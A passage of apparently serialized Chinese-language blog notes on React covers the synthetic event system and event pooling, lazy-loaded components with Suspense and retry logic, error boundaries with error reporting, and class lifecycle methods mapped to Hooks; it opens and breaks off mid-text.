事件系统的设计理念\n\n### 3.1. 合成事件（SyntheticEvent）\n\n- React 实现了一个合成事件层，将浏览器原生事件统一封装为`合成事件`\n- 抹平差异，确保事件在不同浏览器中的行为一致\n- 优化性能，通过`事件委托`和`对象池`来管理事件对象\n\n### 3.2. 事件委托（Event Delegation）\n\n- React 将大多数事件都委托到 document 节点上（在 React 17 之后改为 root 节点）\n\t- React 17 之前，事件都委托到 `document` 上\n\t- React 17 之后，事件委托到 `root 元素`上\n- 减少内存消耗，提高性能\n- 动态绑定，支持组件动态加载\n\n![图片&文件](./files/20241030-1.png)\n\n## 4. 事件系统实现原理\n\n### 4.1. 事件注册\n\n渲染后的真实`DOM`绑定的事件函数都被换成了`空函数`\n\n```jsx\n// React 事件注册\n<button onClick={handleClick}>\n  Click me\n</button>\n\n// 实际转换为\ndocument.addEventListener('click', dispatchEvent, false);\n```\n\n```javascript hl:18,6,4\n// 类组件中的事件处理\nclass Component extends React.Component {\n  handleClick = (e) => {\n    // e 是合成事件对象\n    e.preventDefault();\n    // 阻止事件冒泡\n    e.stopPropagation();\n  }\n  \n  render() {\n    return <button onClick={this.handleClick}>Click</button>\n  }\n}\n\n// 函数组件中的事件处理\nfunction Component() {\n  const handleClick = (e) => {\n    // 访问原生事件\n    console.log(e.nativeEvent); \n  }\n  \n  return <button onClick={handleClick}>Click</button>\n}\n\n```\n\n### 4.2. 事件池\n\n### 4.3. React 16 及之前版本\n\n核心思想是：**React 会在内部维护一个事件对象池，当事件被触发时，React 会从池子中复用事件对象，而不是每次都创建新的事件对象**。在事件处理完成后，这个事件对象会被清空并放回池子中供下次使用。\n\n```jsx\n// 问题示例\nclass Component extends React.Component {\n  handleChange = (e) => {\n    // ❌ 错误的使用方式\n    setTimeout(() => {\n      console.log(e.target.value); // 无法访问，因为事件对象已被清空\n    }, 0);\n    \n    // ✅ 正确的使用方式 - 方法1：调用 persist()\n    e.persist();\n    setTimeout(() => {\n      console.log(e.target.value); // 现在可以正常访问了\n    }, 0);\n    \n    // ✅ 正确的使用方式 - 方法2：提前保存需要的值\n    const value = e.target.value;\n    setTimeout(() => {\n      console.log(value);\n    }, 0);\n  }\n\n  render() {\n    return <input onChange={this.handleChange} />;\n  }\n}\n\n```\n\n#### 4.3.1. React 17\n\nReact 17 **完全移除了事件池机制**，原因是：\n- 现代浏览器性能提升，`对象创建的开销`不再是主要问题\n- 事件池机制经常导致困惑和 bug\n- 代码维护性提升更重要\n\n```javascript hl:4\n// React 17+ 的事件处理\nfunction Component() {\n  const handleClick = (e) => {\n    // 无需调用 e.persist()\n    setTimeout(() => {\n      console.log(e.type); // 正常工作\n      console.log(e.target); // 正常工作\n    }, 0);\n  };\n  return <button onClick={handleClick}>Click</button>;\n}\n```\n\n#### 4.3.2. 总结\n\n- 事件池是 React 16 及之前版本的一个性能优化机制\n- 它通过复用事件对象来减少内存分配和垃圾回收\n- 在 React 17 中被完全移除，使得事件处理更直观和可预测\n\t- 移除事件池后，不再需要调用 `e.persist()`\n- 虽然没有了事件池，但在处理大量事件时仍需注意性能优化\n\n## 5. 常用的事件处理方式\n\n### 5.1. 类组件中的事件处理\n\n```jsx hl:3\nclass MyComponent extends React.Component {\n    handleClick = (e) => {\n        // 使用箭头函数自动绑定this\n        this.setState({ clicked: true });\n    }\n    render() {\n        return <button onClick={this.handleClick}>Click</button>;\n    }\n}\n```\n\n### 5.2. 函数组件中的事件处理\n\n```jsx\nfunction MyComponent() {\n    const handleClick = useCallback((e) => {\n        // 使用 useCallback 优化性能\n        console.log('clicked');\n    }, []);\n\n    return <button onClick={handleClick}>Click</button>;\n}\n```\n\n## 6. 事件处理最佳实践\n\n### 6.1. 性能优化\n\n```jsx\n// 使用防抖或节流\nimport { debounce } from 'lodash';\n\nfunction SearchComponent() {\n    const handleSearch = debounce((value) => {\n        // 执行搜索\n    }, 300);\n\n    return <input onChange={(e) => handleSearch(e.target.value)} />;\n}\n```\n\n### 6.2. 事件解绑\n\n```jsx\nfunction Component() {\n    useEffect(() => {\n        const handleScroll = () => {\n            console.log('scrolling');\n        };\n        window.addEventListener('scroll', handleScroll);\n        \n        // 清理函数\n        return () => {\n            window.removeEventListener('scroll', handleScroll);\n        };\n    }, []);\n}\n```\n\n## 7. 注意事项和常见问题\n\n### 7.1. React事件和原生事件执行顺序\n\n![图片&文件](./files/20241030-2.png)\n\n### 7.2. 事件命名\n\n- React 事件采用驼峰命名（onClick, onSubmit）\n- 原生事件全小写（onclick, onsubmit）\n\n### 7.3. 阻止默认行为\n\n```jsx hl:3\n// React中阻止默认行为\nfunction handleSubmit(e) {\n    e.preventDefault(); // 使用合成事件对象的方法\n    // 而不是 return false\n}\n```\n\n### 7.4. 事件传参\n\n```jsx\n// 推荐方式\n<button onClick={(e) => handleClick(id, e)}>Click</button>\n\n// 或使用 bind\n<button onClick={handleClick.bind(this, id)}>Click</button>\n```\n\n## 8. 特殊场景处理\n\n### 8.1. 处理文档级事件\n\n```jsx\nuseEffect(() => {\n    const handleClickOutside = (event) => {\n        if (ref.current && !ref.current.contains(event.target)) {\n            onClickOutside();\n        }\n    };\n\n    document.addEventListener('mousedown', handleClickOutside);\n    return () => {\n        document.removeEventListener('mousedown', handleClickOutside);\n    };\n}, [onClickOutside]);\n```\n\n### 8.2. 自定义事件\n\n```jsx\nconst customEvent = new CustomEvent('myEvent', {\n    detail: { data: 'some data' }\n});\nelement.dispatchEvent(customEvent);\n```\n\n## 9. 调试技巧\n\n### 9.1. 事件监听器检查\n\n```jsx\n// 开发环境下检查事件绑定\nuseEffect(() => {\n    console.log('Event listeners:', getEventListeners(document));\n}, []);\n```\n\n### 9.2. 事件触发顺序\n\n```jsx\n<div onClick={() => console.log('div')}> // 第三个触发\n    <span onClick={() => console.log('span')}> // 第二个触发\n        <button onClick={() => console.log('button')}>Click</button> // 第一个触发\n    </span>\n</div>\n```\n\n## 10. 性能考虑\n\n- 使用 useCallback 缓存事件处理函数\n- 避免在渲染方法中==创建新的函数==\n- 合理使用事件委托\n- 及时清理不需要的事件监听器\n","yIhjwgST":"\n# React 中实现异步加载组件\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 使用 React.lazy 和 Suspense 实现异步组件\n- 懒加载\n- 重试机制\n- startTransition 优化交互体验\n- 错误处理\n- 异步组件的==自己实现==\n\t- Class 实现 AsyncComponent\n\t- Hooks：useAsync \n\n## 2. React.lazy 和 Suspense（推荐方式）\n\n这是 React 16.6+ 官方提供的异步组件解决方案：\n\n```jsx\n// 1. 基础用法\nimport React, { Suspense } from 'react';\n\n// 使用 React.lazy 动态引入组件\nconst LazyComponent = React.lazy(() => import('./LazyComponent'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading...</div>}>\n      <LazyComponent />\n    </Suspense>\n  );\n}\n\n// 2. 多个异步组件\nconst LazyComponent1 = React.lazy(() => import('./LazyComponent1'));\nconst LazyComponent2 = React.lazy(() => import('./LazyComponent2'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading...</div>}>\n      <div>\n        <LazyComponent1 />\n        <LazyComponent2 />\n      </div>\n    </Suspense>\n  );\n}\n\n// 3. 嵌套 Suspense\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading outer...</div>}>\n      <div>\n        <h1>Main Content</h1>\n        <Suspense fallback={<div>Loading inner...</div>}>\n          <LazyComponent />\n        </Suspense>\n      </div>\n    </Suspense>\n  );\n}\n```\n\n## 3. 路由级别的代码分割\n\n### 3.1. 基础路由懒加载\n\n```jsx\n// 1. 基础路由懒加载\nimport { BrowserRouter as Router, Route, Switch } from 'react-router-dom';\nimport React, { Suspense } from 'react';\n\nconst Home = React.lazy(() => import('./routes/Home'));\nconst About = React.lazy(() => import('./routes/About'));\nconst User = React.lazy(() => import('./routes/User'));\n\nfunction App() {\n  return (\n    <Router>\n      <Suspense fallback={<div>Loading...</div>}>\n        <Switch>\n          <Route exact path=\"/\" component={Home} />\n          <Route path=\"/about\" component={About} />\n          <Route path=\"/user\" component={User} />\n        </Switch>\n      </Suspense>\n    </Router>\n  );\n}\n```\n\n### 3.2. 创建可重用的异步路由组件\n\n```tsx\n// 2. 创建可重用的异步路由组件\nconst AsyncRoute = ({ component: Component, ...rest }) => (\n  <Route\n    {...rest}\n    render={props => (\n      <Suspense fallback={<div>Loading...</div>}>\n        <Component {...props} />\n      </Suspense>\n    )}\n  />\n);\n\n// 使用\nfunction App() {\n  return (\n    <Router>\n      <Switch>\n        <AsyncRoute exact path=\"/\" component={Home} />\n        <AsyncRoute path=\"/about\" component={About} />\n        <AsyncRoute path=\"/user\" component={User} />\n      </Switch>\n    </Router>\n  );\n}\n```\n\n## 4. 自定义异步组件实现\n\n如果需要更细粒度的控制，可以自己实现异步组件：\n\n### 4.1. 基于 Class 组件的实现\n\n```jsx hl:13\n// 1. 基于 Class 组件的实现\nclass AsyncComponent extends React.Component {\n  state = {\n    Component: null\n  };\n\n  componentDidMount() {\n    this.loadComponent();\n  }\n\n  loadComponent = async () => {\n    const { loader } = this.props;\n    const Component = await loader();\n    this.setState({ Component });\n  };\n\n  render() {\n    const { Component } = this.state;\n    const { fallback, ...props } = this.props;\n\n    return Component ? <Component {...props} /> : fallback;\n  }\n}\n\n// 使用方式\nconst AsyncHome = props => (\n  <AsyncComponent\n    loader={() => import('./Home')}\n    fallback={<div>Loading...</div>}\n    {...props}\n  />\n);\n\n```\n\n### 4.2. 基于 Hooks 的实现\n\n```jsx\n\n// 2. 基于 Hooks 的实现\nfunction useAsync(loader) {\n  const [Component, setComponent] = React.useState(null);\n\n  React.useEffect(() => {\n    loader().then(comp => {\n      setComponent(comp.default || comp);\n    });\n  }, [loader]);\n\n  return Component;\n}\n\nfunction AsyncComponent({ loader, fallback, ...props }) {\n  const Component = useAsync(loader);\n  return Component ? <Component {...props} /> : fallback;\n}\n```\n\n## 5. 错误处理和重试机制\n\n### 5.1. 使用 Error Boundary\n\n```jsx hl:5\n// 1. 使用 Error Boundary\nclass ErrorBoundary extends React.Component {\n  state = { hasError: false };\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    console.error('Error:', error, errorInfo);\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return <div>Something went wrong!</div>;\n    }\n    return this.props.children;\n  }\n}\n\n// 使用\nfunction App() {\n  return (\n    <ErrorBoundary>\n      <Suspense fallback={<div>Loading...</div>}>\n        <LazyComponent />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n\n```\n\n### 5.2. 带重试机制的异步组件\n\n```javascript\n\n// 2. 带重试机制的异步组件\nfunction RetryableAsyncComponent({ loader, maxRetries = 3, ...props }) {\n  const [error, setError] = React.useState(null);\n  const [retries, setRetries] = React.useState(0);\n  const [Component, setComponent] = React.useState(null);\n\n  const loadComponent = async () => {\n    try {\n      const comp = await loader();\n      setComponent(comp.default || comp);\n      setError(null);\n    } catch (err) {\n      setError(err);\n      if (retries < maxRetries) {\n        setTimeout(() => {\n          setRetries(r => r + 1);\n          loadComponent(); // 递归调用\n        }, Math.pow(2, retries) * 1000); // 指数退避\n      }\n    }\n  };\n\n  React.useEffect(() => {\n    loadComponent();\n  }, []);\n\n  if (error && retries >= maxRetries) {\n    return <div>Failed to load component after {maxRetries} retries</div>;\n  }\n\n  return Component ? <Component {...props} /> : <div>Loading...</div>;\n}\n```\n\n### 5.3. 最简单的重试机制\n\n```javascript\nfunction RetryableComponent({ retries = 3 }) {\n  const [retry, setRetry] = useState(0);\n\n  return (\n    <ErrorBoundary\n      onError={() => {\n        if (retry < retries) {\n          setRetry(r => r + 1);\n        }\n      }}\n    >\n      <Suspense fallback={<Loading />}>\n        <LazyComponent key={retry} />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n\n```\n\n## 6. 性能优化\n\n### 6.1. 在需要时预加载\n\n```jsx\n// 1. 预加载组件\nconst LazyComponent = React.lazy(() => import('./LazyComponent'));\n\n// 在需要时预加载\nconst preloadComponent = () => {\n  const componentPromise = import('./LazyComponent');\n  return componentPromise;\n};\n\n// 使用\nfunction App() {\n  const handleMouseEnter = () => {\n    preloadComponent(); // 用户hover时预加载\n  };\n\n  return (\n    <div onMouseEnter={handleMouseEnter}>\n      <Suspense fallback={<div>Loading...</div>}>\n        <LazyComponent />\n      </Suspense>\n    </div>\n  );\n}\n\n\n```\n\n### 6.2. 优化加载状态\n\n```javascript\n// 2. 优化加载状态\nfunction DelayedFallback({ delay = 200 }) {\n  const [show, setShow] = React.useState(false);\n\n  React.useEffect(() => {\n    const timer = setTimeout(() => setShow(true), delay);\n    return () => clearTimeout(timer);\n  }, [delay]);\n\n  return show ? <div>Loading...</div> : null;\n}\n\nfunction App() {\n  return (\n    <Suspense fallback={<DelayedFallback />}>\n      <LazyComponent />\n    </Suspense>\n  );\n}\n```\n\n### 6.3. 使用 `startTransition` 优化用户体验\n\n```javascript\nimport { startTransition } from 'react';\n\nfunction App() {\n  const [tab, setTab] = useState('home');\n\n  const switchTab = (nextTab) => {\n    startTransition(() => {\n      setTab(nextTab);\n    });\n  };\n\n  return (\n    <div>\n      <TabButton onClick={() => switchTab('home')}>Home</TabButton>\n      <TabButton onClick={() => switchTab('profile')}>Profile</TabButton>\n      <Suspense fallback={<Loading />}>\n        {tab === 'home' ? <Home /> : <Profile />}\n      </Suspense>\n    </div>\n  );\n}\n\n```\n\n## 7. 数据预加载\n\n```jsx\n// 1. 创建资源加载器\nfunction createResource(promise) {\n  let status = 'pending';\n  let result;\n  let suspender = promise.then(\n    r => {\n      status = 'success';\n      result = r;\n    },\n    e => {\n      status = 'error';\n      result = e;\n    }\n  );\n\n  return {\n    read() {\n      if (status === 'pending') {\n        throw suspender;\n      } else if (status === 'error') {\n        throw result;\n      } else if (status === 'success') {\n        return result;\n      }\n    }\n  };\n}\n\n// 2. 使用数据预加载\nconst dataResource = createResource(fetch('/api/data').then(r => r.json()));\n\nfunction AsyncDataComponent() {\n  const data = dataResource.read();\n  return <div>{data.message}</div>;\n}\n\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading...</div>}>\n      <AsyncDataComponent />\n    </Suspense>\n  );\n}\n```\n\n## 8. 建议\n\n在实际应用中，建议：\n- 优先使用 React.lazy 和 Suspense\n- 在路由层面实现代码分割\n\t- 实现代码分割和按需加载\n- 实现适当的错误处理\n- 添加加载状态反馈\n\t- 提供良好的加载体验\n- 考虑预加载策略\n\t- 实现数据预加载\n- 优化加载体验\n\n","YvA5LvXj":"\n# React 中错误捕获的方式\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- `static getDerivedStateFromError`\n\t- 更新 state，降级 UI 显示\n- componentDidCatch\n\t- 更后面，将错误日志上报给服务器\n- 全局错误\n\t- window.onerror \n\t- window.addEventListener('unhandledrejection'\n\t- window.addEventListener('error'\n- 通用的错误解决方案\n\t- 错误类型枚举\n\t- 错误上报\n\t- 默认错误回退组件等\n\t- 分层上报\n\n\n> 更多参考\n> - [22. 前端错误的分类、优先级管理及处理策略](/post/fOP9lXd1.html)\n> - [22. 前端错误的分类和优先级管理建议](/post/800WyJFR.html)\n\n## 1. Error Boundary（错误边界）\n\n这是 React 官方推荐的捕获渲染错误的方式：\n\n```jsx hl:7,12,36\nclass ErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { hasError: false, error: null, errorInfo: null };\n  }\n\n  static getDerivedStateFromError(error) {\n    // 更新 state，下次渲染时显示降级 UI\n    return { hasError: true, error };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    // 可以在这里将错误日志上报给服务器\n    console.error('Error:', error);\n    console.error('Error Info:', errorInfo);\n    this.setState({\n      error,\n      errorInfo\n    });\n  }\n\n  render() {\n    if (this.state.hasError) {\n      return (\n        <div className=\"error-boundary\">\n          <h2>Something went wrong</h2>\n          <details>\n            <summary>Error Details</summary>\n            <pre>{this.state.error && this.state.error.toString()}</pre>\n            <pre>{this.state.errorInfo && this.state.errorInfo.componentStack}</pre>\n          </details>\n        </div>\n      );\n    }\n\n    return this.props.children;\n  }\n}\n```\n\n## 2. 全局错误处理\n\n```jsx hl:10\n// 在应用入口处设置\nwindow.onerror = function(message, source, lineno, colno, error) {\n  // 处理全局错误\n  console.error('Global error:', { message, source, lineno, colno, error });\n  // 上报错误\n  return false;\n};\n\n// 处理 Promise 中的错误\nwindow.addEventListener('unhandledrejection', function(event) {\n  console.error('Unhandled promise rejection:', event.reason);\n  // 上报错误\n  event.preventDefault();\n});\n```\n\n## 3. 异步错误处理\n\n```jsx\n// 异步组件的错误处理\nconst AsyncComponent = React.lazy(() => import('./AsyncComponent'));\n\nfunction SafeAsyncComponent() {\n  return (\n    <ErrorBoundary>\n      <Suspense fallback={<Loading />}>\n        <AsyncComponent />\n      </Suspense>\n    </ErrorBoundary>\n  );\n}\n\n// 异步请求错误处理\nasync function fetchData() {\n  try {\n    const response = await fetch('/api/data');\n    const data = await response.json();\n    return data;\n  } catch (error) {\n    // 处理错误\n    console.error('API Error:', error);\n    throw error; // 或者返回默认值\n  }\n}\n```\n\n## 4. 通用错误处理解决方案\n\n### 4.1. 创建错误类型枚举\n\n```javascript\n// 1. 创建错误类型枚举\nconst ErrorTypes = {\n  NETWORK_ERROR: 'NETWORK_ERROR',\n  RENDER_ERROR: 'RENDER_ERROR',\n  RUNTIME_ERROR: 'RUNTIME_ERROR',\n  BUSINESS_ERROR: 'BUSINESS_ERROR'\n};\n```\n\n### 4.2. 创建自定义错误类\n\n```tsx\n// 2. 创建自定义错误类\nclass AppError extends Error {\n  constructor(type, message, metadata = {}) {\n    super(message);\n    this.type = type;\n    this.metadata = metadata;\n    this.timestamp = new Date().toISOString();\n  }\n}\n```\n\n### 4.3. 错误处理服务：记得上报\n\n```tsx hl:28,22\n// 3. 错误处理服务\nclass ErrorService {\n  static async reportError(error, componentInfo = null) {\n    const errorReport = {\n      error: {\n        message: error.message,\n        stack: error.stack,\n        type: error.type || 'UNKNOWN',\n        metadata: error.metadata || {},\n      },\n      component: componentInfo,\n      userInfo: {\n        // 收集用户信息\n        userId: localStorage.getItem('userId'),\n        userAgent: navigator.userAgent,\n        // 其他相关信息\n      },\n      timestamp: new Date().toISOString()\n    };\n\n    try {\n      await fetch('/api/error-logging', {\n        method: 'POST',\n        body: JSON.stringify(errorReport)\n      });\n    } catch (e) {\n      console.error('Failed to report error:', e);\n      // 可以考虑使用备用报告机制，如 sendBeacon\n      navigator.sendBeacon('/api/error-logging', JSON.stringify(errorReport));\n    }\n  }\n  static getErrorMessage(error) {\n    // 根据错误类型返回用户友好的错误信息\n    const messages = {\n      [ErrorTypes.NETWORK_ERROR]: '网络连接出现问题，请检查网络后重试',\n      [ErrorTypes.RENDER_ERROR]: '页面渲染出现问题，请刷新重试',\n      [ErrorTypes.BUSINESS_ERROR]: error.message,\n      'default': '系统出现未知错误，请稍后重试'\n    };\n\n    return messages[error.type] || messages.default;\n  }\n}\n```\n\n### 4.4. 增强版错误边界组件\n\n```tsx\n// 4. 增强版错误边界组件\nclass EnhancedErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      hasError: false,\n      error: null,\n      errorInfo: null\n    };\n  }\n\n  static getDerivedStateFromError(error) {\n    return { hasError: true, error };\n  }\n\n  componentDidCatch(error, errorInfo) {\n    ErrorService.reportError(error, {\n      componentStack: errorInfo.componentStack,\n      componentName: this.props.name || 'Unknown'\n    });\n  }\n\n  handleRetry = () => {\n    this.setState({ hasError: false, error: null, errorInfo: null });\n  };\n\n  render() {\n    if (this.state.hasError) {\n      return this.props.fallback ? (\n        this.props.fallback({\n          error: this.state.error,\n          retry: this.handleRetry\n        })\n      ) : (\n        <DefaultErrorFallback\n          error={this.state.error}\n          onRetry={this.handleRetry}\n        />\n      );\n    }\n\n    return this.props.children;\n  }\n}\n```\n\n### 4.5. 默认错误回退组件\n\n```tsx\n// 5. 默认错误回退组件\nfunction DefaultErrorFallback({ error, onRetry }) {\n  return (\n    <div className=\"error-container\">\n      <h2>出错啦！</h2>\n      <p>{ErrorService.getErrorMessage(error)}</p>\n      <button onClick={onRetry}>重试</button>\n    </div>\n  );\n}\n```\n\n### 4.6. 使用示例\n\n```jsx\n\n// 6. 使用示例\nfunction App() {\n  return (\n    <EnhancedErrorBoundary\n      name=\"RootApp\"\n      fallback={({ error, retry }) => (\n        <CustomErrorUI error={error} onRetry={retry} />\n      )}\n    >\n      <Router>\n        {/* 路由配置 */}\n      </Router>\n    </EnhancedErrorBoundary>\n  );\n}\n\n// 7. 异步组件错误处理\nconst AsyncComponent = React.lazy(() => \n  import('./AsyncComponent')\n    .catch(error => {\n      ErrorService.reportError(\n        new AppError(ErrorTypes.RUNTIME_ERROR, 'Failed to load component', {\n          componentName: 'AsyncComponent'\n        })\n      );\n      // 返回一个默认导出，避免应用崩溃\n      return { default: () => <DefaultErrorFallback /> };\n    })\n);\n\n// 8. API 请求错误处理\nconst api = {\n  async fetch(url, options = {}) {\n    try {\n      const response = await fetch(url, options);\n      \n      if (!response.ok) {\n        throw new AppError(\n          ErrorTypes.NETWORK_ERROR,\n          `HTTP error! status: ${response.status}`,\n          { url, status: response.status }\n        );\n      }\n\n      const data = await response.json();\n      return data;\n    } catch (error) {\n      if (error instanceof AppError) {\n        throw error;\n      }\n      \n      throw new AppError(\n        ErrorTypes.NETWORK_ERROR,\n        'Failed to fetch data',\n        { url, originalError: error.message }\n      );\n    }\n  }\n};\n\n// 9. 在组件中使用\nfunction DataComponent() {\n  const [data, setData] = useState(null);\n  const [error, setError] = useState(null);\n\n  useEffect(() => {\n    async function fetchData() {\n      try {\n        const result = await api.fetch('/api/data');\n        setData(result);\n      } catch (error) {\n        setError(error);\n        ErrorService.reportError(error, {\n          componentName: 'DataComponent',\n          action: 'fetchData'\n        });\n      }\n    }\n\n    fetchData();\n  }, []);\n\n  if (error) {\n    return <ErrorMessage error={error} />;\n  }\n\n  if (!data) {\n    return <Loading />;\n  }\n\n  return <div>{/* 渲染数据 */}</div>;\n}\n```\n\n## 5. 使用建议\n\n### 5.1. 在应用的关键节点使用 ErrorBoundary\n\n```jsx\nfunction App() {\n  return (\n    <EnhancedErrorBoundary name=\"Root\">\n      <Router>\n        <Switch>\n          <Route path=\"/dashboard\">\n            <EnhancedErrorBoundary name=\"Dashboard\">\n              <Dashboard />\n            </EnhancedErrorBoundary>\n          </Route>\n          {/* 其他路由 */}\n        </Switch>\n      </Router>\n    </EnhancedErrorBoundary>\n  );\n}\n```\n\n### 5.2. 对于重要的异步操作添加错误处理\n\n```jsx\nfunction ImportantComponent() {\n  const handleImportantAction = async () => {\n    try {\n      await performAction();\n    } catch (error) {\n      ErrorService.reportError(\n        new AppError(ErrorTypes.BUSINESS_ERROR, '操作失败', {\n          action: 'importantAction'\n        })\n      );\n      // 显示用户友好的错误消息\n      message.error(ErrorService.getErrorMessage(error));\n    }\n  };\n\n  return <button onClick={handleImportantAction}>执行操作</button>;\n}\n```\n\n### 5.3. 在开发环境提供详细信息，生产环境注意安全\n\n```jsx\nconst ErrorMessage = ({ error }) => (\n  <div className=\"error-message\">\n    <h3>{ErrorService.getErrorMessage(error)}</h3>\n    {process.env.NODE_ENV === 'development' && (\n      <details>\n        <summary>Debug Information</summary>\n        <pre>{JSON.stringify(error, null, 2)}</pre>\n      </details>\n    )}\n  </div>\n);\n```\n\n### 5.4. 分层错误处理\n\n这种分层方式确保了即使某个部分出错，其他部分仍然可以正常工作\n\n```javascript\n// App.js\nfunction App() {\n  return (\n    <ErrorBoundary>\n      <div className=\"app\">\n        <Header />\n        <main>\n          <ErrorBoundary>\n            <Router>\n              <Switch>\n                <Route path=\"/dashboard\">\n                  <ErrorBoundary>\n                    <Dashboard />\n                  </ErrorBoundary>\n                </Route>\n                {/* 其他路由 */}\n              </Switch>\n            </Router>\n          </ErrorBoundary>\n        </main>\n        <Footer />\n      </div>\n    </ErrorBoundary>\n  );\n}\n\n```\n\n### 5.5. 记得错误监控和上报\n\n```javascript\n// 错误监控服务\nconst errorTracker = {\n  init() {\n    // 初始化错误追踪服务\n  },\n\n  captureError(error, context = {}) {\n    // 收集错误信息\n    const errorInfo = {\n      message: error.message,\n      stack: error.stack,\n      timestamp: new Date().toISOString(),\n      userInfo: getUserInfo(),\n      context,\n    };\n\n    // 发送到服务器\n    this.sendToServer(errorInfo);\n  },\n\n  sendToServer(errorInfo) {\n    fetch('/api/errors', {\n      method: 'POST',\n      body: JSON.stringify(errorInfo),\n    }).catch(err => {\n      // 确保错误上报本身的错误不会影响应用\n      console.error('Error reporting failed:', err);\n    });\n  }\n};\n\n```","3OYUTphf":"\n# React Class 类生命周期如何对应 Hooks\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Class 组件 ==<=>== Hooks 等效实现\n\n```javascript\n// Class 组件              Hooks 等效实现\n// ------------------------------------------\n// constructor              -> useState, useRef\n// getDerivedStateFromProps -> useEffect 配合 useState\n// shouldComponentUpdate    -> React.memo\n// render                   -> 函数本身\n// componentDidMount        -> useEffect([])\n// componentDidUpdate       -> useEffect([deps])\n// componentWillUnmount     -> useEffect 返回的清理函数\n// componentDidCatch        -> 需要使用 Class 组件\n// getSnapshotBeforeUpdate  -> 没有直接等效实现\n\n```\n\n- getDerivedStateFromError 与 componentDidCatch 区别\n\t - getDerivedStateFromError 在`渲染阶段`调用，是==同步==的\n\t- 用于==降级 UI，容错==\n\t - componentDidCatch 在`提交阶段`调用，可以执行副作用\n\t - `getDerivedStateFromError` 必须返回一个`状态对象`\n\t - `getDerivedStateFromError` 支持**服务端渲染**，而 `componentDidCatch` 不支持 \n- Class组件的生命周期，分==五个阶段==\n\t- 初始化 + 挂载阶段 + 组件更新 + 卸载 + 错误处理\n- React 为什么要废弃 `componentwillMount`、`componentWillReceiveProps`、`componentWillUpdate` `\n\t- 在`fiber`中，==render 可被打断==，**可能在 wilMount 中获取到的元素状态很可能与实际需要的不同\n\t- ==一句话就是，Render 阶段可能会被打断，那么 willxxx 就可以执行多次==\n\n## 2. 先说Class组件的生命周期\n\n分四个阶段：组件挂载阶段 + 组件更新 + 卸载 + 错误处理阶段 ，如下图：\n\n![图片&文件](./files/20241030-3.png)\n\n### 2.1. 第一阶段：组件挂载阶段\n\n挂载阶段组件被创建，然后组件实例插入到 DOM 中，完成组件的第一次渲染，在此阶段`会依次调用`以下这些方法\n- `constructor`：初始化组件的 `state`，给事件处理方法绑定 `this`\n- `getDerivedStateFromProps`，静态方法，它存在只有一个目的：**让组件在 props 变化时更新 state**。\n\t- 该方法返回一个对象用于更新 `state`，如果返回 `null` 则不更新任何内容\n- `render`：根据状态 `state` 和属性 `props` 渲染组件。\n\t- **这个函数只做一件事，就是返回需要渲染的内容，不要在这里面做其他事情**\n- `componentDidMount`：代表`组件挂载完成`， 在这里可以DOM操作、网络请求、事件订阅等\n\t- 其实`不推荐直接在componentDidMount直接调用setState`，因为我们又调用了一次`setState`，就会在未来再进行一次`render`，造成不必要的性能浪费，**大多数情况可以设置初始值来搞定**\n\n#### 2.1.1. 代码详细示例\n\n下面是详细使用示例：\n1. constructor\n2. static getDerivedStateFromProps\n3. render\n4. componentDidMount\n\n```jsx hl:2,15,34,44\nclass MyComponent extends React.Component {\n  // 1. constructor\n  constructor(props) {\n    super(props);\n    this.state = {\n      count: 0\n    };\n    // 用途：\n    // - 初始化 state\n    // - 绑定事件处理器\n    // - 不应该在这里调用 setState\n    // - 不应该产生副作用\n  }\n\n  // 2. static getDerivedStateFromProps\n  static getDerivedStateFromProps(props, state) {\n    // 参数：\n    // - props: 新的属性\n    // - state: 当前状态\n    // 返回值：返回一个对象来更新 state，或者返回 null 表示不更新\n    // 用途：\n    // - 根据 props 更新 state\n    // - 是静态方法，不能访问 this\n    // - 应该是纯函数，不应该产生副作用\n    if (props.count !== state.prevCount) {\n      return {\n        count: props.count,\n        prevCount: props.count\n      };\n    }\n    return null;\n  }\n\n  // 3. render\n  render() {\n    // 用途：\n    // - 返回要渲染的内容\n    // - 必须是纯函数\n    // - 不能调用 setState\n    // - 不能直接与浏览器交互\n    return <div>{this.state.count}</div>;\n  }\n\n  // 4. componentDidMount\n  componentDidMount() {\n    // 用途：\n    // - 发起网络请求\n    // - 添加订阅\n    // - 操作 DOM\n    // - 设置定时器\n    fetch('api/data')\n      .then(response => response.json())\n      .then(data => this.setState({ data }));\n  }\n}\n```\n\n### 2.2. 第二阶段：组件更新阶段\n\n- `getDerivedStateFromProps`，如上\n- `shouldComponentUpdate(nextProps, nextState)` 是否应该渲染组件 \n\t- `性能优化的点`\n- `render`，如上\n- `getSnapshotBeforeUpdate(prevProps, prevState)`\n\t- 在 `render` 之后，`componentDidUpdate` 之前调用\n\t- 最近一次渲染输出（提交到 DOM 节点）之前调用。即` React更新DOM或Refs之前调用 `\n\t- 返回值作为第三个参数传给`componentDidUpdate`\n- `componentDidUpdate(prevProps, prevState, snapshot){}` ，更新后立即被调用，通常做以下操作\n\t- 当组件更新后，对`DOM 进行操作`；\n\t- 参数\n\t\t- snapshot: getSnapshotBeforeUpdate 的返回值\n\t\t- prevProps: 更新前的属性\n\t    - prevState: 更新前的状态\n\t- 如果你对更新前后的 `props` 进行了比较，也可以选择在此处进行`网络请求`；\n\t\t- （例如，当 `props` 未发生变化时，则不会执行网络请求）\n\n#### 2.2.1. 代码详细示例\n\n1. static getDerivedStateFromProps\n2. shouldComponentUpdate\n3. render\n4. getSnapshotBeforeUpdate\n5. componentDidUpdate\n\n```jsx hl:10,25,38\nclass MyComponent extends React.Component {\n  // 1. static getDerivedStateFromProps\n  // 同上，每次更新也会调用\n\n  // 2. shouldComponentUpdate\n  